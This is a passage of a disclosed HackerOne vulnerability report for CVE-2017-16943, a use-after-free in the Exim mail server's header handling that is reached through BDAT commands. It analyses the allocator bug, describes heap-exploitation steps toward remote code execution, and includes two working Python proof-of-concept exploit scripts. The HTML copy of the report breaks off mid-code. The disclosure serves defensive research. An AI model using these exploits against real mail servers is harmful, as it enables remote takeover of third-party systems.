{"id":296991,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTY5OTE=","url":"https://hackerone.com/reports/296991","title":"Exim use-after-free vulnerability while reading mail header involving BDAT commands","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2017-12-11T15:51:58.192Z","submitted_at":"2017-12-11T15:51:58.192Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mehqq","url":"/mehqq","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/223/779/2feea3759da1e6d5b594b5096db68d21cf917004_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":20,"url":"https://hackerone.com/internet","handle":"internet","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/e3e1c58882b2645d9108ec102731a354cbf5852e_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/e3e1c58882b2645d9108ec102731a354cbf5852e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"The Internet","twitter_handle":null,"website":"","about":"Hack all the things."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2017-16943"],"singular_disclosure_disabled":false,"disclosed_at":"2019-11-12T23:45:11.583Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-10-13T23:45:11.243Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Original article is [here](https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/)\n\n# Use-after-free in receive_msg leads to RCE\n\n### Vulnerability Analysis\nTo explain this bug, we need to start with the memory management of exim. There is a series of functions starts with `store_` such as `store_get`, `store_release`, `store_reset`. These functions are used to manage dynamically allocated memory and improve performance. Its architecture is like the illustration below:\n![architecture of storeblock](https://d2mxuefqeaa7sj.cloudfront.net/s_250CBD95095D0019FAC82FED4F605A7EFB015920E271206EB018526E9DD7E3F0_1510286247190_exim+store+1.png)\n\nInitially, exim allocates a big storeblock (default 0x2000) and then cut it into **stores** when `store_get` is called, using global pointers to record the size of unused memory and where to cut in next allocation. Once the `current_block` is insufficient, it allocates a new block and appends it to the end of the chain, which is a linked list, and then makes `current_block` point to it. Exim maintains three `store_pool`, that is, there are three chains like the illustration above and every global variables are actually arrays.\nThis vulnerability is in `receive_msg` where exim reads headers: \n[receive.c: 1817 receive_msg](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1817)\n```c\n  if (ptr \u003e= header_size - 4)\n    {\n    int oldsize = header_size;\n    /* header_size += 256; */\n    header_size *= 2;\n    if (!store_extend(next-\u003etext, oldsize, header_size))\n      {\n      uschar *newtext = store_get(header_size);\n      memcpy(newtext, next-\u003etext, ptr);\n      store_release(next-\u003etext);\n      next-\u003etext = newtext;\n      }\n    }\n```\nIt seems normal if the store functions are just like realloc, malloc and free. However, they are different and cannot be used in this way. When exim tries to **extend** store, the function `store_extend` checks whether the old store is the latest store allocated in `current_block`. It returns False immediately if the check is failed.\n[store.c: 276 store_extend](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/store.c#L276)\n```c\nif (CS ptr + rounded_oldsize != CS (next_yield[store_pool]) ||\n    inc \u003e yield_length[store_pool] + rounded_oldsize - oldsize)\n  return FALSE;\n```\nOnce `store_extend` fails, exim tries to get a new store and release the old one. After we look into  `store_get` and store_release, we found that `store_get` returns a **store**, but `store_release` releases a **block** if the store is at the head of it. That is to say, if `next-\u003etext` points to the start the `current_block` and `store_get` cuts store inside it for `newtext`, then `store_release(next-\u003etext)` frees `next-\u003etext`, which is equal to `current_block`, and leaves `newtext` and `current_block` pointing to a freed memory area. Any further usage of these pointers leads to a use-after-free vulnerability. To trigger this bug, we need to make exim call `store_get` after `next-\u003etext` is allocated. This was impossible until BDAT command was introduced into exim. BDAT makes `store_get` reachable and finally leads to an RCE.\nExim uses [function pointers](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/globals.h#L136) to switch between different input sources, such as `receive_getc`, `receive_getbuf`. When receiving BDAT data, `receive_getc` is set to `bdat_getc` in order to check left chunking data size and to handle following command of BDAT. In `receive_msg`, exim also uses `receive_getc`. It loops to read data, and stores data into `next-\u003etext`, extends if insufficient.\n[receive.c: 1817 receive_msg](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1789)\n```c\nfor (;;)\n  {\n  int ch = (receive_getc)(GETC_BUFFER_UNLIMITED);\n  \n  /* If we hit EOF on a SMTP connection, it's an error, since incoming\n  SMTP must have a correct \".\" terminator. */\n\n  if (ch == EOF \u0026\u0026 smtp_input /* \u0026\u0026 !smtp_batched_input */)\n    {\n    smtp_reply = handle_lost_connection(US\" (header)\");\n    smtp_yield = FALSE;\n    goto TIDYUP;                       /* Skip to end of function */\n    }\n```\nIn `bdat_getc`, once the SIZE is reached, it tries to read the next BDAT command and raises error message if the following command is incorrect. \n[smtp_in.c: 628 bdat_getc](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L628)\n```c\n    case BDAT_CMD:\n      {\n      int n;\n\n      if (sscanf(CS smtp_cmd_data, \"%u %n\", \u0026chunking_datasize, \u0026n) \u003c 1)\n\t{\n\t(void) synprot_error(L_smtp_protocol_error, 501, NULL,\n\t  US\"missing size for BDAT command\");\n\treturn ERR;\n\t}\n```\nIn exim, it usually calls `synprot_error` to raise error message, which also logs at the same time.\n[smtp_in.c: 628 bdat_getc](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L2984)\n```c\nstatic int\nsynprot_error(int type, int code, uschar *data, uschar *errmess)\n{\nint yield = -1;\n\nlog_write(type, LOG_MAIN, \"SMTP %s error in \\\"%s\\\" %s %s\",\n  (type == L_smtp_syntax_error)? \"syntax\" : \"protocol\",\n  string_printing(smtp_cmd_buffer), host_and_ident(TRUE), errmess);\n```\nThe log messages are printed by string_printing. This function ensures a string is printable. For this reason, it extends the string to transfer characters if any unprintable character exists, such as `'\\n'-\u003e'\\\\n'`. Therefore, it asks `store_get` for memory to store strings.\nThis store makes `    if (!store_extend(next-\u003etext, oldsize, header_size))` in `receive_msg` failed when next extension occurs and then triggers use-after-free.\n\n### Exploitation\nThe following is the Proof-of-Concept(PoC) python script of this vulnerability. This PoC controls the control flow of SMTP server and sets instruction pointer to `0xdeadbeef`. For fuzzing issue, we did change the runtime configuration of exim. As a result, this PoC works only when **dkim** is enabled. We use it as an example because the situation is less complicated. The version with default configuration is also exploitable, and we will discuss it at the end of this section.\n```python\n# CVE-2017-16943 PoC by meh at DEVCORE\n# pip install pwntools\nfrom pwn import *\n\nr = remote('127.0.0.1', 25)\n\nr.recvline()\nr.sendline(\"EHLO test\")\nr.recvuntil(\"250 HELP\")\nr.sendline(\"MAIL FROM:\u003cmeh@some.domain\u003e\")\nr.recvline()\nr.sendline(\"RCPT TO:\u003cmeh@some.domain\u003e\")\nr.recvline()\nr.sendline('a'*0x1250+'\\x7f')\nr.recvuntil('command')\nr.sendline('BDAT 1')\nr.sendline(':BDAT \\x7f')\ns = 'a'*6 + p64(0xdeadbeef)*(0x1e00/8)\nr.send(s+ ':\\r\\n')\nr.recvuntil('command')\nr.send('\\n')\n\nr.interactive()\n```\n\n1. Running out of `current_block`\n    In order to achieve code execution, we need to make the `next-\u003etext` get the first store of a block. That is, running out of `current_block` and making `store_get` allocate a new block. Therefore, we send a long message `'a'*0x1250+'\\x7f'` with an unprintable character to cut `current_block`, making `yield_length` less than 0x100.\n![](https://i.imgur.com/PaQWaAT.png)\n\n2. Starts BDAT data transfer\n    After that, we send BDAT command to start data transfer. At the beginning, `next` and `next-\u003etext` are allocated by `store_get`. \n    ![](https://i.imgur.com/C9PPhPY.png)\n    The function `dkim_exim_verify_init` is called sequentially and it also calls `store_get`. Notice that this function uses **ANOTHER `store_pool`**, so it allocates from heap without changing `current_block` which `next-\u003etext` also points to.\n[receive.c: 1734 receive_msg](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1734)\n    ```c\n    if (smtp_input \u0026\u0026 !smtp_batched_input \u0026\u0026 !dkim_disable_verify)\n      dkim_exim_verify_init(chunking_state \u003c= CHUNKING_OFFERED);\n    ```\n\n3. Call `store_getc` inside `bdat_getc`\n    Then, we send a BDAT command without SIZE. Exim complains about the incorrect command and cuts the `current_block` with `store_get` in `string_printing`. \n![](https://i.imgur.com/5M1q0c4.png)\n\n4. Keep sending msg until extension and bug triggered\n    In this way, while we keep sending huge messages, `current_block` gets freed after the extension. In the malloc.c of glibc (so called ptmalloc), system manages a linked list of freed memory chunks, which is called unsortbin. Freed chunks are put into unsortbin if it is not the last chunk on the heap. In step 2, `dkim_exim_verify_init` allocated chunks after `next-\u003etext`. Therefore, this chunk is put into unsortbin and the pointers of linked list are stored into the first 16 bytes of chunk (on x86-64). The location written is exactly `current_block-\u003enext`, and therefore `current_block-\u003enext` is overwritten to `unsortbin` inside `main_arena` of libc (linked list pointer `fd` points back to `unsortbin` if no other freed chunk exists). \n![](https://i.imgur.com/xdGViKJ.png)\n\n5. Keep sending msg for the next extension\n    When the next extension occurs, `store_get` tries to cut from `main_arena`, which makes attackers able to overwrite all global variables below main_arena. \n6. Overwrite global variables in libc\n7. Finish sending message and trigger `free()`\n    In the PoC, we simply modified `__free_hook` and ended the line. Exim calls `store_reset` to reset the buffer and calls `__free_hook` in `free()`. At this stage, we successfully controlled instruction pointer `$rip`.\n    However, this is not enough for an RCE because the arguments are uncontrollable. As a result, we improved this PoC to modify both `__free_hook` and `_IO_2_1_stdout_`. We forged the vtable of `stdout` and set `__free_hook` to any call of `fflush(stdout)` inside exim. When the program calls fflush, it sets the first argument to stdout and jumps to a function pointer on the vtable of stdout. Hence, we can control both `$rip` and the content of first argument. \n    We consulted past CVE exploits and decided to call `expand_string`, which executes command with `execv` if we set the first argument to `${run{cmd}}`, and finally we got our RCE. \n    ![](https://i.imgur.com/2EkljvM.png)\n\n\n#### Exploit for default configured exim\nWhen dkim is disabled, the PoC above fails because `current_block` is the last chunk on heap. This makes the system merge it into a big chunk called **top chunk** rather than unsortbin.\nThe illustrations below describe the difference of heap layout:\n![](https://i.imgur.com/RQ9LVOb.png)\n![](https://i.imgur.com/X29oSsT.png)\n\nTo avoid this, we need to make exim allocate and free some memories before we actually start our exploitation. Therefore, we add some steps between step 1 and step 2.\n\nAfter running out of `current_block`:\n1. Use DATA command to send lots of data\n    Send huge data, make the chunk big and extend many times. After several extension, it calls `store_get` to retrieve a bigger store and then releases the old one. This repeats many times if the data is long enough. Therefore, we have a big chunk in unsortbin.\n2. End DATA transfer and start a new email\n    Restart to send an email with BDAT command after the heap chunk is prepared.\n3. Adjust `yield_length` again\n    Send invalid command with an unprintable charater again to cut the `current_block`.\n\nFinally the heap layout is like:\n![](https://i.imgur.com/b4phS3c.png)\n\nAnd now we can go back to the step 2 at the beginning and create the same situation. When `next-\u003etext` is freed, it goes back to unsortbin and we are able to overwrite libc global variables again.\nThe following is the PoC for default configured exim:\n```python\n# CVE-2017-16943 PoC by meh at DEVCORE\n# pip install pwntools\nfrom pwn import *\n\nr = remote('localhost', 25)\n\nr.recvline()\nr.sendline(\"EHLO test\")\nr.recvuntil(\"250 HELP\")\nr.sendline(\"MAIL FROM:\u003c\u003e\")\nr.recvline()\nr.sendline(\"RCPT TO:\u003cmeh@some.domain\u003e\")\nr.recvline()\nr.sendline('a'*0x1280+'\\x7f')\nr.recvuntil('command')\nr.sendline('DATA')\nr.recvuntil('itself\\r\\n')\nr.sendline('b'*0x4000+':\\r\\n')\nr.sendline('.\\r\\n')\nr.sendline('.\\r\\n')\nr.recvline()\nr.sendline(\"MAIL FROM:\u003c\u003e\")\nr.recvline()\nr.sendline(\"RCPT TO:\u003cmeh@some.domain\u003e\")\nr.recvline()\nr.sendline('a'*0x3480+'\\x7f')\nr.recvuntil('command')\nr.sendline('BDAT 1')\nr.sendline(':BDAT \\x7f')\ns = 'a'*6 + p64(0xdeadbeef)*(0x1e00/8)\nr.send(s+ ':\\r\\n')\nr.send('\\n')\nr.interactive()\n```\n\nA demo of our exploit is as below.\n![](https://i.imgur.com/jumGJMG.png)\nNote that we have not found a way to leak memory address and therefore we use heap spray instead. It requires another information leakage vulnerability to overcome the PIE mitigation on x86-64.\n\n## Impact\n\nRemote code execution on remote mail server, affecting over 500k mail servers.","vulnerability_information_html":"\u003cp\u003eOriginal article is \u003ca href=\"/redirect?url=https%3A%2F%2Fdevco.re%2Fblog%2F2017%2F12%2F11%2FExim-RCE-advisory-CVE-2017-16943-en%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehere\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"use-after-free-in-receive_msg-leads-to-rce\"\u003eUse-after-free in receive_msg leads to RCE\u003c/h1\u003e\n\n\u003ch3 id=\"vulnerability-analysis\"\u003eVulnerability Analysis\u003c/h3\u003e\n\n\u003cp\u003eTo explain this bug, we need to start with the memory management of exim. There is a series of functions starts with \u003ccode\u003estore_\u003c/code\u003e such as \u003ccode\u003estore_get\u003c/code\u003e, \u003ccode\u003estore_release\u003c/code\u003e, \u003ccode\u003estore_reset\u003c/code\u003e. These functions are used to manage dynamically allocated memory and improve performance. Its architecture is like the illustration below:\u003cbr\u003e\n![architecture of storeblock](\u003ca title=\"https://d2mxuefqeaa7sj.cloudfront.net/s_250CBD95095D0019FAC82FED4F605A7EFB015920E271206EB018526E9DD7E3F0_1510286247190_exim+store+1.png\" href=\"/redirect?url=https%3A%2F%2Fd2mxuefqeaa7sj.cloudfront.net%2Fs_250CBD95095D0019FAC82FED4F605A7EFB015920E271206EB018526E9DD7E3F0_1510286247190_exim%2Bstore%2B1.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://d2mxuefqeaa7sj.cloudfront.net/s_250CBD95095D0019FAC82FED4F605A7EFB015920E271206EB018526E9DD7E3F0_1510286247190_exim+store+1.png\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003c/p\u003e\n\n\u003cp\u003eInitially, exim allocates a big storeblock (default 0x2000) and then cut it into \u003cstrong\u003estores\u003c/strong\u003e when \u003ccode\u003estore_get\u003c/code\u003e is called, using global pointers to record the size of unused memory and where to cut in next allocation. Once the \u003ccode\u003ecurrent_block\u003c/code\u003e is insufficient, it allocates a new block and appends it to the end of the chain, which is a linked list, and then makes \u003ccode\u003ecurrent_block\u003c/code\u003e point to it. Exim maintains three \u003ccode\u003estore_pool\u003c/code\u003e, that is, there are three chains like the illustration above and every global variables are actually arrays.\u003cbr\u003e\nThis vulnerability is in \u003ccode\u003ereceive_msg\u003c/code\u003e where exim reads headers: \u003cbr\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FExim%2Fexim%2Fblob%2Fe924c08b7d031b712013a7a897e2d430b302fe6c%2Fsrc%2Fsrc%2Freceive.c%23L1817\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ereceive.c: 1817 receive_msg\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eptr\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;=\u003c/span\u003e \u003cspan class=\"n\"\u003eheader_size\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003eoldsize\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eheader_size\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"cm\"\u003e/* header_size += 256; */\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eheader_size\u003c/span\u003e \u003cspan class=\"o\"\u003e*=\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003estore_extend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003enext\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eoldsize\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eheader_size\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"n\"\u003euschar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003enewtext\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003estore_get\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eheader_size\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n      \u003cspan class=\"n\"\u003ememcpy\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003enewtext\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003enext\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eptr\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n      \u003cspan class=\"n\"\u003estore_release\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003enext\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n      \u003cspan class=\"n\"\u003enext\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003enewtext\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt seems normal if the store functions are just like realloc, malloc and free. However, they are different and cannot be used in this way. When exim tries to \u003cstrong\u003eextend\u003c/strong\u003e store, the function \u003ccode\u003estore_extend\u003c/code\u003e checks whether the old store is the latest store allocated in \u003ccode\u003ecurrent_block\u003c/code\u003e. It returns False immediately if the check is failed.\u003cbr\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FExim%2Fexim%2Fblob%2Fe924c08b7d031b712013a7a897e2d430b302fe6c%2Fsrc%2Fsrc%2Fstore.c%23L276\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003estore.c: 276 store_extend\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eCS\u003c/span\u003e \u003cspan class=\"n\"\u003eptr\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003erounded_oldsize\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"n\"\u003eCS\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003enext_yield\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003estore_pool\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e\n    \u003cspan class=\"n\"\u003einc\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003eyield_length\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003estore_pool\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003erounded_oldsize\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"n\"\u003eoldsize\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eFALSE\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOnce \u003ccode\u003estore_extend\u003c/code\u003e fails, exim tries to get a new store and release the old one. After we look into  \u003ccode\u003estore_get\u003c/code\u003e and store_release, we found that \u003ccode\u003estore_get\u003c/code\u003e returns a \u003cstrong\u003estore\u003c/strong\u003e, but \u003ccode\u003estore_release\u003c/code\u003e releases a \u003cstrong\u003eblock\u003c/strong\u003e if the store is at the head of it. That is to say, if \u003ccode\u003enext-\u0026gt;text\u003c/code\u003e points to the start the \u003ccode\u003ecurrent_block\u003c/code\u003e and \u003ccode\u003estore_get\u003c/code\u003e cuts store inside it for \u003ccode\u003enewtext\u003c/code\u003e, then \u003ccode\u003estore_release(next-\u0026gt;text)\u003c/code\u003e frees \u003ccode\u003enext-\u0026gt;text\u003c/code\u003e, which is equal to \u003ccode\u003ecurrent_block\u003c/code\u003e, and leaves \u003ccode\u003enewtext\u003c/code\u003e and \u003ccode\u003ecurrent_block\u003c/code\u003e pointing to a freed memory area. Any further usage of these pointers leads to a use-after-free vulnerability. To trigger this bug, we need to make exim call \u003ccode\u003estore_get\u003c/code\u003e after \u003ccode\u003enext-\u0026gt;text\u003c/code\u003e is allocated. This was impossible until BDAT command was introduced into exim. BDAT makes \u003ccode\u003estore_get\u003c/code\u003e reachable and finally leads to an RCE.\u003cbr\u003e\nExim uses \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FExim%2Fexim%2Fblob%2Fe924c08b7d031b712013a7a897e2d430b302fe6c%2Fsrc%2Fsrc%2Fglobals.h%23L136\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003efunction pointers\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to switch between different input sources, such as \u003ccode\u003ereceive_getc\u003c/code\u003e, \u003ccode\u003ereceive_getbuf\u003c/code\u003e. When receiving BDAT data, \u003ccode\u003ereceive_getc\u003c/code\u003e is set to \u003ccode\u003ebdat_getc\u003c/code\u003e in order to check left chunking data size and to handle following command of BDAT. In \u003ccode\u003ereceive_msg\u003c/code\u003e, exim also uses \u003ccode\u003ereceive_getc\u003c/code\u003e. It loops to read data, and stores data into \u003ccode\u003enext-\u0026gt;text\u003c/code\u003e, extends if insufficient.\u003cbr\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FExim%2Fexim%2Fblob%2Fe924c08b7d031b712013a7a897e2d430b302fe6c%2Fsrc%2Fsrc%2Freceive.c%23L1789\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ereceive.c: 1817 receive_msg\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(;;)\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003ech\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ereceive_getc\u003c/span\u003e\u003cspan class=\"p\"\u003e)(\u003c/span\u003e\u003cspan class=\"n\"\u003eGETC_BUFFER_UNLIMITED\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n  \u003cspan class=\"cm\"\u003e/* If we hit EOF on a SMTP connection, it\u0026#39;s an error, since incoming\n  SMTP must have a correct \u0026quot;.\u0026quot; terminator. */\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ech\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eEOF\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003esmtp_input\u003c/span\u003e \u003cspan class=\"cm\"\u003e/* \u0026amp;\u0026amp; !smtp_batched_input */\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"n\"\u003esmtp_reply\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ehandle_lost_connection\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eUS\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot; (header)\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003esmtp_yield\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eFALSE\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003egoto\u003c/span\u003e \u003cspan class=\"n\"\u003eTIDYUP\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e                       \u003cspan class=\"cm\"\u003e/* Skip to end of function */\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn \u003ccode\u003ebdat_getc\u003c/code\u003e, once the SIZE is reached, it tries to read the next BDAT command and raises error message if the following command is incorrect. \u003cbr\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FExim%2Fexim%2Fblob%2Fe924c08b7d031b712013a7a897e2d430b302fe6c%2Fsrc%2Fsrc%2Fsmtp_in.c%23L628\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003esmtp_in.c: 628 bdat_getc\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e    \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"n\"\u003eBDAT_CMD\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esscanf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eCS\u003c/span\u003e \u003cspan class=\"n\"\u003esmtp_cmd_data\u003c/span\u003e\u003cspan 